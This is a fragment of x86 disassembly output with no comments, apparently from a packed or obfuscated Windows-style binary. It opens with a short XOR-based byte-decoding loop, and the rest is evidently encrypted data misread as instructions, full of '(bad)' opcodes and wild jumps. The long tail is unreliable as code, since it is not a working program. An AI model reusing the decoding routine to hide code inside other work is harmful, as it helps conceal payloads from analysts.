  406081:	imul   eax,edx
  406084:	mov    edx,DWORD PTR [ebp-0x5c]
  406087:	xor    edx,esi
  406089:	add    eax,edx
  40608b:	mov    edx,DWORD PTR [ebp-0x8]
  40608e:	movzx  eax,BYTE PTR [eax+edx*1+0x3272fa]
  406096:	mov    edx,DWORD PTR [ebp-0x4c]
  406099:	xor    edx,esi
  40609b:	lea    eax,[edx+eax*1+0x3272fa]
  4060a2:	movzx  edx,BYTE PTR [ebp-0x1]
  4060a6:	xor    edx,eax
  4060a8:	mov    BYTE PTR [ebp-0x1],dl
  4060ab:	mov    al,BYTE PTR [ebp-0x1]
  4060ae:	mov    edx,DWORD PTR [ebp-0x30]
  4060b1:	mov    ebx,DWORD PTR [ebp-0xc]
  4060b4:	xor    edx,esi
  4060b6:	add    edx,edi
  4060b8:	imul   edx,ebx
  4060bb:	mov    ebx,DWORD PTR [ebp-0x8]
  4060be:	mov    BYTE PTR [edx+ebx*1],al
  4060c1:	mov    eax,DWORD PTR [ebp-0x30]
  4060c4:	mov    edx,DWORD PTR [ebp-0xc]
  4060c7:	xor    eax,esi
  4060c9:	add    eax,edi
  4060cb:	imul   eax,edx
  4060ce:	mov    edx,DWORD PTR [ebp-0x8]
  4060d1:	jmp    0x408469
  4060d6:	leave  
  4060d7:	pop    es
  4060d8:	xchg   DWORD PTR ds:0x47490549,eax
  4060de:	(bad)  
  4060df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060e0:	or     bl,cl
  4060e2:	sar    BYTE PTR [ebp-0x3e8e3196],0x7b
  4060e9:	jnp    0x4060df
  4060eb:	pushf  
  4060ec:	jnp    0x406169
  4060ee:	nop
  4060ef:	fidivr WORD PTR [edi+0x60]
  4060f2:	clc    
  4060f3:	sti    
  4060f4:	test   DWORD PTR [edi+0x71cf49ec],esp
  4060fa:	shl    BYTE PTR [edi+0x11],cl
  4060fd:	ds cdq 
  4060ff:	imul   ecx,DWORD PTR [ebx+0x5],0x36
  406103:	mov    bl,BYTE PTR [edi+0x64]
  406106:	in     eax,0x78
  406108:	cmp    BYTE PTR [ebx*2+0x17c22f10],cl
  40610f:	iret   
  406110:	rcl    BYTE PTR [eax],1
  406112:	dec    edx
  406113:	mov    ebp,0xb2ef9213
  406118:	pop    es
  406119:	inc    edi
  40611a:	mov    edi,0x87c2fa55
  40611f:	ret    
  406120:	stos   DWORD PTR es:[edi],eax
  406121:	loope  0x40610f
  406123:	adc    esi,DWORD PTR [esi-0x773de4ed]
  406129:	test   eax,0xaa6c8cb6
  40612e:	sbb    DWORD PTR [edx+0x3a],ecx
  406131:	xchg   esp,eax
  406132:	shr    BYTE PTR [edx-0x1f],cl
  406135:	dec    esp
  406136:	xchg   ebx,eax
  406137:	leave  
  406138:	leave  
  406139:	and    ebx,ecx
  40613b:	retf   0xf1eb
  40613e:	mov    dh,0xd3
  406140:	xlat   BYTE PTR ds:[ebx]
  406141:	aam    0x7b
  406143:	inc    eax
  406144:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406145:	ins    DWORD PTR es:[edi],dx
  406146:	fsubr  QWORD PTR [ecx]
  406148:	aam    0xa2
  40614a:	pop    ss
  40614b:	imul   esi,DWORD PTR [edi],0x43a436a8
  406151:	adc    eax,0xc191012e
  406156:	pop    esp
  406157:	repnz add cl,bl
  40615a:	test   al,0xb7
  40615c:	xor    edx,edx
  40615e:	rcr    dl,0xed
  406161:	ins    DWORD PTR es:[edi],dx
  406162:	addr16 sti 
  406164:	daa    
  406165:	mov    esp,0x7046b03c
  40616a:	cli    
  40616b:	and    DWORD PTR [ecx-0x4a],ecx
  40616e:	stc    
  40616f:	fxch   st(4)
  406171:	cmp    al,0xb6
  406173:	mov    dl,cl
  406175:	data16 sti 
  406177:	adc    BYTE PTR [eax+0x247daa23],0x0
  40617e:	or     al,0x69
  406180:	fs pop es
  406182:	pushf  
  406183:	stc    
  406184:	or     dl,BYTE PTR [esi+0x35]
  406187:	in     al,dx
  406188:	lds    ebp,FWORD PTR [ebx-0x17]
  40618b:	lahf   
  40618c:	sbb    DWORD PTR [ebx],edx
  40618e:	add    dh,BYTE PTR [edi+0x156590a2]
  406194:	call   0xf836f313
  406199:	adc    bh,ah
  40619b:	enter  0x284d,0xf5
  40619f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4061a0:	dec    ecx
  4061a1:	pop    es
  4061a2:	mov    ds:0x4688b025,eax
  4061a7:	push   ds
  4061a8:	adc    BYTE PTR [edi-0x629a9ee0],bh
  4061ae:	std    
  4061af:	mov    bl,0xe6
  4061b1:	repnz cdq 
  4061b3:	and    BYTE PTR [edi-0x3a4ce9d7],bl
  4061b9:	jmp    0xe93096b4
  4061be:	cmc    
  4061bf:	xchg   edx,eax
  4061c0:	xor    eax,DWORD PTR [esi-0x64ddce16]
  4061c6:	das    
  4061c7:	inc    esp
  4061c8:	cmp    eax,0xf5f0f67a
  4061cd:	push   0x97d9a7e5
  4061d2:	xor    DWORD PTR [eax+0x20b078e7],edi
  4061d8:	dec    ebx
  4061d9:	xor    dh,bh
  4061db:	retf   
  4061dc:	ss push 0xf4acac5b
  4061e2:	pop    edx
  4061e3:	cmp    eax,0xc9ae2f5
  4061e8:	adc    al,0x27
  4061ea:	push   ebx
  4061eb:	and    al,0x6f
  4061ed:	inc    BYTE PTR [edx-0x4c]
  4061f0:	test   BYTE PTR [ecx+0x146e805e],dh
  4061f6:	(bad)  
  4061f7:	ins    BYTE PTR es:[edi],dx
  4061f8:	enter  0xd745,0x40
  4061fc:	cmp    ecx,DWORD PTR [edi]
  4061fe:	cmp    cl,BYTE PTR [eax-0x3a]
  406201:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406202:	or     eax,0xd9f4761b
  406207:	js     0x40620b
  406209:	pusha  
  40620a:	cld    
  40620b:	and    ah,bh
  40620d:	ins    DWORD PTR es:[edi],dx
  40620e:	jmp    0x4061b1
  406210:	outs   dx,BYTE PTR ds:[esi]
  406211:	or     dl,BYTE PTR [edi+0x4]
  406214:	bound  edi,QWORD PTR [esi+edi*1+0x22]
  406218:	icebp  
  406219:	xor    BYTE PTR [ecx+0x2c],dl
  40621c:	fabs   
  40621e:	mov    al,ds:0xd8185aea
  406223:	cld    
  406224:	mov    esi,0x4fcc1004
  406229:	jmp    0xc655c740
  40622e:	jecxz  0x4062aa
  406230:	xchg   esi,eax
  406231:	mov    bl,0x4
  406233:	add    DWORD PTR [ecx+0xba765bf],ebp
  406239:	ret    
  40623a:	adc    eax,0x41ec58c2
  40623f:	popa   
  406240:	add    BYTE PTR [ecx-0x34],ah
  406243:	ja     0x406275
  406245:	or     BYTE PTR [ebp+edx*2-0x75],bh
  406249:	push   esi
  40624a:	inc    ebx
  40624b:	stc    
  40624c:	(bad)  
  40624d:	mov    ch,0x4e
  40624f:	jmp    0x4062ad
  406251:	jb     0x40620b
  406253:	dec    esi
  406254:	push   edi
  406255:	je     0x406298
  406257:	test   DWORD PTR [esi-0x53b9ee2d],edi
  40625d:	div    DWORD PTR [esi+0x11]
  406260:	xchg   edx,eax
  406261:	and    eax,0x1045f7c3
  406266:	inc    ebx
  406267:	(bad)  
  406268:	into   
  406269:	and    eax,0xfd4db30c
  40626e:	imul   ebp,DWORD PTR [eax-0x48c5b947],0x69
  406275:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406276:	pop    edi
  406277:	pusha  
  406278:	rol    al,1
  40627a:	ss jo  0x406235
  40627d:	out    dx,eax
  40627e:	sub    ch,BYTE PTR [eax]
  406280:	or     eax,0xd7c1b4af
  406285:	mov    ecx,0x93cf95d6
  40628a:	into   
  40628b:	popa   
  40628c:	xor    edx,DWORD PTR [esi]
  40628e:	dec    eax
  40628f:	lea    ebp,[ebx+0x7e]
  406292:	pop    ss
  406293:	shr    BYTE PTR [esp+ecx*4-0x6ac87fec],1
  40629a:	mov    esp,0xc0adb33d
  40629f:	cmp    cl,bh
  4062a1:	pop    ebx
  4062a2:	cs lock jmp 0x40629b
  4062a6:	inc    ebx
  4062a7:	mov    bh,0xeb
  4062a9:	aam    0x5c
  4062ab:	rol    ah,0xfb
  4062ae:	jb     0x40631f
  4062b0:	inc    ebp
  4062b1:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4062b3:	sub    DWORD PTR [edx+0xa],edx
  4062b6:	mov    ds:0x3139f1f3,al
  4062bb:	jo     0x406331
  4062bd:	int3   
  4062be:	add    edi,esp
  4062c0:	lock fst DWORD PTR [esi+eiz*8]
  4062c4:	pop    ebx
  4062c5:	mov    ebp,0x37b86780
  4062ca:	cs push ss
  4062cc:	js     0x40632e
  4062ce:	imul   ecx,DWORD PTR [ecx+0x1d],0x46774541
  4062d5:	mov    esp,0xfe83de93
  4062da:	jno    0x406312
  4062dc:	jecxz  0x406266
  4062de:	push   ebx
  4062df:	cmp    BYTE PTR [edi-0x5b],cl
  4062e2:	daa    
  4062e3:	sbb    edi,DWORD PTR [edx-0x5792c406]
  4062e9:	enter  0x796e,0xb2
  4062ed:	cmp    DWORD PTR [ebp+0x318eba35],edx
  4062f3:	adc    DWORD PTR [eax-0x2e0a054f],eax
  4062f9:	xchg   DWORD PTR [esp+eax*2+0x4b],ebp
  4062fd:	retf   
  4062fe:	ins    DWORD PTR es:[edi],dx
  4062ff:	cmp    al,cl
  406301:	jle    0x40631d
  406303:	sbb    BYTE PTR [ebp-0x30210090],ah
  406309:	aam    0xad
  40630b:	pop    edx
  40630c:	or     BYTE PTR [ecx-0xe55dd50],dh
  406312:	jb     0x40629c
  406314:	or     al,BYTE PTR [eax-0x24d400ba]
  40631a:	mov    ebx,0xff89d3f8
  40631f:	ffree  st(6)
  406321:	ret    0x1bec
  406324:	mov    al,0xb2
  406326:	(bad)  
  406327:	xlat   BYTE PTR ds:[ebx]
  406328:	std    
  406329:	mov    ds:0x94a00937,eax
  40632e:	push   0xa6f58aa9
  406333:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406334:	and    ecx,DWORD PTR [ebp+eax*2-0xa7844fc]
  40633b:	pop    edx
  40633c:	leave  
  40633d:	mov    bl,0x55
  40633f:	in     eax,dx
  406340:	aas    
  406341:	imul   ecx,DWORD PTR [edx-0x2295b679],0x3dadb852
  40634b:	jmp    0x70a10021
  406350:	pop    esp
  406351:	sbb    ebx,DWORD PTR [ebp+0x2af968bb]
  406357:	mov    bh,0xb2
  406359:	ret    0xc1bb
  40635c:	cmp    esi,DWORD PTR [eax]
  40635e:	jnp    0x406343
  406360:	push   0xc6bf7a19
  406365:	push   ebp
  406366:	inc    ecx
  406367:	sbb    eax,0x4e9ef2aa
  40636c:	or     DWORD PTR [eax-0x3727d9eb],ecx
  406372:	mov    dl,0x9f
  406374:	add    BYTE PTR [edx-0xe84a9ed],bl
  40637a:	(bad)  [eax+edx*4+0x30]
  40637e:	mov    dh,BYTE PTR [edx+0x5e]
  406381:	imul   edx,DWORD PTR [ebx],0x5b534873
  406387:	add    edx,esi
  406389:	out    dx,eax
  40638a:	in     al,dx
  40638b:	cdq    
  40638c:	ss jo  0x406330
  40638f:	test   dh,cl
  406391:	xor    BYTE PTR [edi+0x9],ah
  406394:	pop    edi
  406395:	mov    ch,BYTE PTR [ebp-0xa084b70]
  40639b:	test   DWORD PTR [edx],esi
  40639d:	pop    esp
  40639e:	stos   DWORD PTR es:[edi],eax
  40639f:	push   ds
  4063a0:	xchg   ebp,eax
  4063a1:	xchg   ecx,eax
  4063a2:	inc    edi
  4063a3:	call   0x6e86:0xb4bf6ac7
  4063aa:	out    0x93,al
  4063ac:	pusha  
  4063ad:	push   ss
  4063ae:	call   0xe0cf:0x52013977
  4063b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4063b6:	(bad)  
  4063b7:	dec    esi
  4063b8:	sub    al,BYTE PTR [ebx+0xb400a51]
  4063be:	pop    esi
  4063bf:	fimul  WORD PTR [ebx]
  4063c1:	adc    eax,0x4c863091
  4063c6:	test   al,0xec
  4063c8:	lds    ebx,FWORD PTR [ebx-0x5db3dc8a]
  4063ce:	jecxz  0x40642f
  4063d0:	in     al,dx
  4063d1:	dec    esi
  4063d2:	mov    ds:0x2ecccbea,eax
  4063d7:	xor    al,BYTE PTR [ebx+0x18]
  4063da:	mov    WORD PTR [ebx-0x72],fs
  4063dd:	jbe    0x4063e5
  4063df:	mov    ebp,ss
  4063e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063e2:	jge    0x406408
  4063e4:	cmp    al,0xe7
  4063e6:	jg     0x4063fc
  4063e8:	dec    esp
  4063e9:	or     al,BYTE PTR [ecx-0x4238b608]
  4063ef:	and    BYTE PTR ds:0xb8aacf9a,0x5d
  4063f6:	rcr    DWORD PTR [ebx-0x65],0x67
  4063fa:	xchg   esp,eax
  4063fb:	lds    eax,FWORD PTR [esi+ebp*1-0x1cac3ba1]
  406402:	sub    edx,edx
  406404:	cmpxchg BYTE PTR [edi-0x5],cl
  406408:	add    DWORD PTR [edi+esi*8],ebp
  40640b:	xchg   ebx,eax
  40640c:	jb     0x4063f3
  40640e:	addr16 adc eax,0x531a9b20
  406414:	(bad)  
  406415:	push   esi
  406416:	in     eax,dx
  406417:	dec    edx
  406418:	invd   
  40641a:	ja     0x40647f
  40641c:	mov    eax,ds:0xef1a21e4
  406421:	sbb    esi,edi
  406423:	lods   al,BYTE PTR ds:[esi]
  406424:	pop    edi
  406425:	push   ds
  406426:	adc    DWORD PTR [ebx],esi
  406428:	retf   
  406429:	scas   al,BYTE PTR es:[edi]
  40642a:	jmp    0xa95e:0x6c87dacc
  406431:	call   DWORD PTR [edi+0x2b]
  406434:	les    esi,FWORD PTR [esi+esi*1-0x39]
  406438:	ins    BYTE PTR es:[edi],dx
  406439:	push   esi
  40643a:	repnz mov esi,DWORD PTR [ebx-0x2a]
  40643e:	ins    DWORD PTR es:[edi],dx
  40643f:	pop    edx
  406440:	in     al,0xa2
  406442:	aam    0x6a
  406444:	mov    ah,0xea
  406446:	in     al,dx
  406447:	arpl   WORD PTR [ebx+0x78],sp
  40644a:	aam    0x1c
  40644c:	sbb    bh,bh
  40644e:	scas   al,BYTE PTR es:[edi]
  40644f:	and    BYTE PTR [edi-0x68b28487],bl
  406455:	jnp    0x4064b5
  406457:	and    al,0x70
  406459:	sbb    eax,0xd057eaa4
  40645e:	mov    dl,0x5e
  406460:	push   0xffffffa3
  406462:	das    
  406463:	xchg   esi,eax
  406464:	fcom   DWORD PTR [ebx-0x2a]
  406467:	sbb    edi,ecx
  406469:	das    
  40646a:	inc    eax
  40646b:	push   cs
  40646c:	in     al,0x44
  40646e:	lahf   
  40646f:	inc    eax
  406470:	addr16 pushf 
  406472:	std    
  406473:	data16 int 0x4
  406476:	fimul  DWORD PTR [ebp-0x75]
  406479:	dec    eax
  40647a:	jmp    0x4064f0
  40647c:	cmc    
  40647d:	push   ebx
  40647e:	imul   eax,DWORD PTR [ebx],0x3d4c739c
  406484:	ins    BYTE PTR es:[edi],dx
  406485:	out    0xb,eax
  406487:	call   0x982b21dc
  40648c:	xlat   BYTE PTR ds:[ebx]
  40648d:	adc    eax,esi
  40648f:	(bad)  
  406490:	jne    0x406419
  406492:	call   0x9550:0xd78fa887
  406499:	push   esi
  40649a:	out    0x7b,eax
  40649c:	cmp    eax,0x71eaacc9
  4064a1:	in     al,0x93
  4064a3:	mov    bh,0x8a
  4064a5:	lock or eax,0x2c6de363
  4064ab:	jo     0x406464
  4064ad:	jle    0x4064ad
  4064af:	xchg   edi,eax
  4064b0:	jle    0x406485
  4064b2:	mov    DWORD PTR [eax+0x5b],0xe352ea7c
  4064b9:	jns    0x40644a
  4064bb:	lahf   
  4064bc:	sub    ecx,DWORD PTR [eax]
  4064be:	inc    eax
  4064bf:	sub    DWORD PTR [ecx-0x64],0xffffff8e
  4064c3:	(bad)  
  4064c4:	push   eax
  4064c5:	add    BYTE PTR [ebx],al
  4064c7:	lods   al,BYTE PTR ds:[esi]
  4064c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064c9:	inc    edx
  4064ca:	scas   al,BYTE PTR es:[edi]
  4064cb:	gs cwde 
  4064cd:	mov    BYTE PTR [ebx+0x42],cl
  4064d0:	push   ss
  4064d1:	int    0xc4
  4064d3:	mov    ds:0x6761bdf2,al
  4064d8:	aad    0x66
  4064da:	push   es
  4064db:	mov    ds:0x32886b09,al
  4064e0:	(bad)  
  4064e1:	jecxz  0x4064d1
  4064e3:	lock dec ebp
  4064e5:	dec    esp
  4064e6:	stc    
  4064e7:	aas    
  4064e8:	xchg   ebx,eax
  4064e9:	aas    
  4064ea:	arpl   WORD PTR [eax],dx
  4064ec:	imul   ebx,ebx,0xffffffb0
  4064ef:	push   es
  4064f0:	mov    bh,0x55
  4064f2:	fbld   TBYTE PTR [ecx-0x4c82ced7]
  4064f8:	pop    esi
  4064f9:	cmp    BYTE PTR [esp+edi*2],ch
  4064fc:	jmp    0xee763bc2
  406501:	or     DWORD PTR [ebx-0x56b7ef89],0xb4fda73a
  40650b:	add    DWORD PTR [esi+eax*4+0x7639dbcd],edx
  406512:	push   ds
  406513:	xor    eax,0xd6c3d70c
  406518:	pop    esp
  406519:	lds    eax,FWORD PTR [esi]
  40651b:	mov    cl,0xa8
  40651d:	xlat   BYTE PTR ds:[ebx]
  40651e:	push   cs
  40651f:	inc    edx
  406520:	(bad)  
  406521:	push   0xb0b526bc
  406526:	mov    dh,0x48
  406528:	repz mov ebp,0x64342030
  40652e:	clc    
  40652f:	push   eax
  406530:	imul   edi,esp,0x7b7ee0bf
  406536:	ss cli 
  406538:	adc    al,0xd
  40653a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40653b:	and    WORD PTR ds:0xdbf9e3b0,ax
  406542:	mov    WORD PTR [ebx+0x72],gs
  406545:	in     eax,0xca
  406547:	rcl    BYTE PTR [eax],cl
  406549:	cld    
  40654a:	sbb    BYTE PTR [edx+0x19],ah
  40654d:	xchg   edx,eax
  40654e:	nop
  40654f:	push   DWORD PTR [ecx-0x6c]
  406552:	adc    al,0xfe
  406554:	mov    ecx,0x5e79a42
  406559:	test   al,0x1d
  40655b:	pop    ebp
  40655c:	(bad)  
  40655d:	out    0x4a,eax
  40655f:	mov    dl,0xdb
  406561:	pop    edi
  406562:	push   edx
  406563:	jbe    0x406565
  406565:	mov    DWORD PTR [edx],ecx
  406567:	inc    ebp
  406568:	or     al,0xef
  40656a:	or     edi,DWORD PTR [eax]
  40656c:	mov    bl,BYTE PTR [ecx-0x1e]
  40656f:	sub    bl,BYTE PTR [esi]
  406571:	xchg   ebx,eax
  406572:	test   DWORD PTR [edx],0x8e1cfd31
  406578:	sbb    al,0x16
  40657a:	push   0xffffffbd
  40657c:	and    al,0x43
  40657e:	fcom   DWORD PTR [edi+0x57]
  406581:	push   esi
  406582:	hlt    
  406583:	dec    esp
  406584:	mov    ebx,0x388524ef
  406589:	mov    ds:0xbb74c4f5,eax
  40658e:	(bad)  
  40658f:	jmp    DWORD PTR [ecx+0x22]
  406592:	inc    edx
  406593:	inc    ebx
  406594:	mov    eax,ds:0x24e8e64
  406599:	pop    edi
  40659a:	add    BYTE PTR [ebx-0x3b],bh
  40659d:	in     eax,dx
  40659e:	out    dx,eax
  40659f:	xchg   edi,eax
  4065a0:	pop    esp
  4065a1:	aas    
  4065a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4065a3:	mov    dl,BYTE PTR [ecx]
  4065a5:	pop    es
  4065a6:	nop
  4065a7:	xor    BYTE PTR ds:0xb807fc72,cl
  4065ad:	in     al,dx
  4065ae:	xchg   ebx,eax
  4065af:	and    bl,BYTE PTR [eax+ecx*2-0x4]
  4065b3:	dec    edi
  4065b4:	push   ecx
  4065b5:	and    al,0xb7
  4065b7:	or     DWORD PTR [ebx+0x1e],edi
  4065ba:	inc    edi
  4065bb:	in     eax,0xd1
  4065bd:	mov    al,ds:0xacc27fe8
  4065c2:	push   0xffffffdd
  4065c4:	lock pop edi
  4065c6:	test   BYTE PTR [esi+edx*8+0x3e7dce47],ch
  4065cd:	push   ebp
  4065ce:	sahf   
  4065cf:	int    0x21
  4065d1:	mov    cl,0x22
  4065d3:	repz mov bl,0x1a
  4065d6:	xor    BYTE PTR [ebx-0x2f],dh
  4065d9:	mov    ds:0x2662d7bc,al
  4065de:	push   0xffffffe0
  4065e0:	lea    ecx,[edx-0x1fbb88e2]
  4065e6:	mov    ds:0xecb2bb3f,al
  4065eb:	in     eax,dx
  4065ec:	inc    eax
  4065ed:	mov    cl,0x8c
  4065ef:	shl    DWORD PTR [esi+0x5d],0xec
  4065f3:	cdq    
  4065f4:	push   esi
  4065f5:	fcom   DWORD PTR [edi*8-0x4cc0d914]
  4065fc:	mov    dl,0x25
  4065fe:	cmp    BYTE PTR [ebp+0x58fb1d52],al
  406604:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406605:	dec    ecx
  406606:	mul    BYTE PTR [edx+0x12ea3e06]
  40660c:	sar    dh,0x5
  40660f:	mov    edi,0x90531c40
  406614:	xor    esi,DWORD PTR [eax+0x45]
  406617:	dec    esp
  406618:	fwait
  406619:	mov    ecx,0x4e4f01bf
  40661e:	add    al,0x7
  406620:	jae    0x4065d1
  406622:	ins    DWORD PTR es:[edi],dx
  406623:	or     ebx,edx
  406625:	add    eax,0xe716ecf1
  40662a:	adc    al,0xd9
  40662c:	(bad)  
  40662d:	mov    ecx,0x2d2d7f6b
  406632:	test   BYTE PTR [esi+0x1a],ch
  406635:	inc    eax
  406636:	fbld   TBYTE PTR [edi-0x2a]
  406639:	xor    al,0xd7
  40663b:	sbb    BYTE PTR [ebp-0x5b],bl
  40663e:	add    DWORD PTR [ebp-0x262c2219],ecx
  406644:	test   eax,0xb39776f6
  406649:	push   ss
  40664a:	sbb    dl,BYTE PTR [edi]
  40664c:	mov    ebp,0xd15991d8
  406651:	dec    eax
  406652:	hlt    
  406653:	imul   BYTE PTR [ecx]
  406655:	push   es
  406656:	jns    0x4066ca
  406658:	pusha  
  406659:	rcl    BYTE PTR [edx+0x57ae7897],cl
  40665f:	stos   DWORD PTR es:[edi],eax
  406660:	mov    dl,0xcb
  406662:	out    0x2b,al
  406664:	xor    dl,al
  406666:	sub    cl,BYTE PTR [bx+di+0x56c3]
  40666b:	jmp    0x406604
  40666d:	adc    al,0x74
  40666f:	call   0xa16f:0xc0d53f48
  406676:	xchg   esp,eax
  406677:	bound  esp,QWORD PTR [edx+0x49]
  40667a:	(bad)  
  40667b:	loopne 0x406660
  40667d:	das    
  40667e:	add    ebp,eax
  406680:	cld    
  406681:	inc    edi
  406682:	out    dx,eax
  406683:	push   es
  406684:	lahf   
  406685:	clc    
  406686:	(bad)  
  406687:	frstor [ebp-0x74f8d879]
  40668d:	popf   
  40668e:	int    0x1a
  406690:	outs   dx,BYTE PTR ds:[esi]
  406691:	leave  
  406692:	fdivr  QWORD PTR [esi+0x3162edf5]
  406698:	pop    edi
  406699:	mul    DWORD PTR [eax-0x458c444e]
  40669f:	sbb    ch,BYTE PTR [edx+0x57b7f959]
  4066a5:	jmp    0xc1792a67
  4066aa:	call   0x3ad3:0x96b6c3d9
  4066b1:	xchg   edi,eax
  4066b2:	lahf   
  4066b3:	jo     0x40665d
  4066b5:	adc    BYTE PTR ds:0xcd94f682,bh
  4066bb:	add    DWORD PTR [ecx+0x1efc542f],esi
  4066c1:	lahf   
  4066c2:	cmp    DWORD PTR [edi+0x65],edx
  4066c5:	lods   eax,DWORD PTR ds:[esi]
  4066c6:	jmp    DWORD PTR [ebx+0x1a]
  4066c9:	sbb    al,BYTE PTR [eax+eiz*8+0x882bd55]
  4066d0:	xor    esp,DWORD PTR [esi+0x1b7ab611]
  4066d6:	pop    DWORD PTR [esp+eax*2]
  4066d9:	outs   dx,DWORD PTR ds:[esi]
  4066da:	add    ah,cl
  4066dc:	lahf   
  4066dd:	(bad)  
  4066de:	sbb    DWORD PTR [edx],edi
  4066e0:	pusha  
  4066e1:	cmp    BYTE PTR [edi+0x40],0x49
  4066e5:	add    eax,0x12e65f77
  4066ea:	push   ds
  4066eb:	imul   edx,ebp,0xffffff9d
  4066ee:	cmc    
  4066ef:	xor    DWORD PTR ds:0x9530c83e,esp
  4066f5:	and    eax,0xda4584ef
  4066fa:	xchg   DWORD PTR [ebp+0x440b4289],ebx
  406700:	xchg   ebp,esp
  406702:	scas   al,BYTE PTR es:[edi]
  406703:	dec    esp
  406704:	mov    cl,BYTE PTR [ebp+0x4278bff3]
  40670a:	(bad)  
  40670b:	call   0x35d1:0x6f63a494
  406712:	loop   0x406708
  406714:	pusha  
  406715:	mov    al,0xac
  406717:	inc    esp
  406718:	xchg   esp,eax
  406719:	sub    eax,0x879a3f7e
  40671e:	xchg   BYTE PTR [ebp-0x4d],ch
  406721:	mov    al,0xcd
  406723:	loopne 0x40672a
  406725:	cmp    DWORD PTR [edx],edi
  406727:	lds    edx,FWORD PTR [esi]
  406729:	and    DWORD PTR ds:0xb04ef84,esp
  40672f:	pop    eax
  406730:	xor    dh,BYTE PTR [edi-0x11]
  406733:	outs   dx,DWORD PTR ds:[esi]
  406734:	cli    
  406735:	mov    ds:0xb22afb5c,al
  40673a:	xchg   ebx,eax
  40673b:	dec    ebp
  40673c:	pop    ecx
  40673d:	pusha  
  40673e:	test   eax,0x474ccd8c
  406743:	daa    
  406744:	xchg   edi,eax
  406745:	je     0x4067b0
  406747:	pop    ebx
  406748:	mov    bh,BYTE PTR [edi-0x4a8c2390]
  40674e:	and    ch,cl
  406750:	mov    BYTE PTR [edi],al
  406752:	adc    eax,0x93ecacec
  406757:	loop   0x4067b2
  406759:	push   esi
  40675a:	scas   al,BYTE PTR es:[edi]
  40675b:	xchg   DWORD PTR [edx+0x79939399],esp
  406761:	lock lods eax,DWORD PTR ds:[esi]
  406763:	push   ebx
  406764:	fdivr  QWORD PTR [edx-0x114bed90]
  40676a:	sbb    al,0x21
  40676c:	adc    ch,BYTE PTR ds:0xf1513e31
  406772:	pop    edi
  406773:	stos   DWORD PTR es:[edi],eax
  406774:	jns    0x40674a
  406776:	mov    bl,0xcf
  406778:	mov    edx,0x956b8ae
  40677d:	bound  ebp,QWORD PTR [edx+0x450741c3]
  406783:	inc    eax
  406784:	mov    ebx,0xa0db3412
  406789:	js     0x4067f3
  40678b:	test   DWORD PTR [esi-0x79],eax
  40678e:	jmp    0x406800
  406790:	(bad)  
  406792:	mov    ebp,0x1a6bbb4b
  406797:	mov    cl,BYTE PTR [edi]
  406799:	add    al,0x3f
  40679b:	lods   al,BYTE PTR ds:[esi]
  40679c:	ss mov cl,0x99
  40679f:	sub    al,0xe8
  4067a1:	push   es
  4067a2:	and    bh,BYTE PTR [ebp+edi*4-0x2]
  4067a6:	iret   
  4067a7:	push   eax
  4067a8:	pop    esp
  4067a9:	jle    0x4067ed
  4067ab:	jle    0x54a59079
  4067b1:	ss xchg ebp,eax
  4067b3:	xor    eax,0x6a89b500
  4067b8:	dec    esp
  4067b9:	adc    eax,0x870c0226
  4067be:	mov    ds:0x92ebd26b,eax
  4067c3:	cs jge 0x4067e5
  4067c6:	fbstp  TBYTE PTR [edi+0xa93884]
  4067cc:	mov    ds:0x27019330,eax
  4067d1:	mov    ebp,0x4bb0acfc
  4067d6:	das    
  4067d7:	jb     0x406844
  4067d9:	call   0x14a6:0x9bd58073
  4067e0:	sub    al,BYTE PTR [edi-0x1a]
  4067e3:	jecxz  0x406796
  4067e5:	imul   ecx,DWORD PTR [edx+0x19],0xae40b44e
  4067ec:	pop    es
  4067ed:	jecxz  0x4067d8
  4067ef:	retf   
  4067f0:	mov    ds:0xab7b8ae0,al
  4067f5:	in     al,dx
  4067f6:	jp     0x40677a
  4067f8:	or     eax,0xc2893827
  4067fd:	mov    BYTE PTR [edi-0x18885e96],ah
  406803:	(bad)  
  406804:	frstor [edi-0x26]
  406807:	mov    bh,dh
  406809:	jmp    0xec83d1a4
  40680e:	push   edi
  40680f:	fst    DWORD PTR [edx]
  406811:	(bad)  
  406812:	cld    
  406813:	mov    ebp,0x18d8be04
  406818:	scas   eax,DWORD PTR es:[edi]
  406819:	cli    
  40681a:	hlt    
  40681b:	sbb    DWORD PTR [esi],ecx
  40681d:	push   esi
  40681e:	mov    cl,0xe2
  406820:	jmp    0x406824
  406822:	mov    ch,BYTE PTR [edi]
  406824:	outs   dx,DWORD PTR ds:[esi]
  406825:	xchg   ebx,eax
  406826:	fstp   TBYTE PTR [esi+0x62]
  406829:	mov    ss,edx
  40682b:	or     esi,DWORD PTR ds:0x6fc4cd1a
  406831:	jecxz  0x40682c
  406833:	mov    DWORD PTR [ebx-0xd7d6086],ebp
  406839:	push   ss
  40683a:	clc    
  40683b:	push   eax
  40683c:	add    DWORD PTR [eax+0x31f9c943],esp
  406842:	loopne 0x40687c
  406844:	push   0x3a
  406846:	mov    ch,ah
  406848:	aad    0x72
  40684a:	in     eax,dx
  40684b:	inc    eax
  40684c:	mov    al,0xcb
  40684e:	mov    ecx,edi
  406850:	push   es
  406851:	or     eax,0xaea13aa
  406856:	hlt    
  406857:	sub    edi,DWORD PTR [ecx]
  406859:	fmul   DWORD PTR [esi]
  40685b:	clc    
  40685c:	nop
  40685d:	add    eax,0x40896db9
  406862:	push   0x2045b6b8
  406867:	add    BYTE PTR [ecx],0x3
  40686a:	and    dl,ch
  40686c:	mov    dh,0x21
  40686e:	cmp    esi,DWORD PTR [ebx-0x30795a85]
  406874:	lahf   
  406875:	sub    eax,0x516e6923
  40687a:	push   esp
  40687b:	mov    al,0x6c
  40687d:	and    DWORD PTR [edx],edx
  40687f:	int    0xbf
  406881:	dec    esp
  406882:	fisubr WORD PTR [edx]
